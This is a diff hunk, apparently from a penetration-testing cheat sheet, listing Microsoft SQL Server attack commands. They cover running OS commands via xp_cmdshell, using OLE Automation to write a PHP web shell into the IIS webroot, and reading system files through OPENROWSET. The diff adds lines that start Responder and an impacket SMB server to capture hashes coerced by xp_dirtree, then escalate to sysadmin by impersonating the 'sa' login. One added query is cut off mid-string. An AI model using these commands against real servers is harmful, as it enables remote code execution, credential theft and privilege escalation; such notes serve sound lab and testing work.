@@ -382,8 +382,13 @@ SQL> EXEC xp_cmdshell "whoami";
 SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
 SQL> EXEC DECLARE @OLE INT; DECLARE @FileID INT; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'; EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE; GO;
 SQL> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+$ sudo responder -I tun0
+$ sudo impacket-smbserver share ./ -smb2support
 SQL> EXEC master..xp_dirtree '\\<IP address>\share\'
 SQL> EXEC master..xp_subdirs '\\<IP address>\share\'
+SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE
+SQL> SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
+SQL> USE master; EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
 SQL> SELECT srvname, isremote FROM sysservers
 SQL> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<IP address>\SQLEXPRESS]
 https://learn.microsoft.com/en-us/ssms/install/install
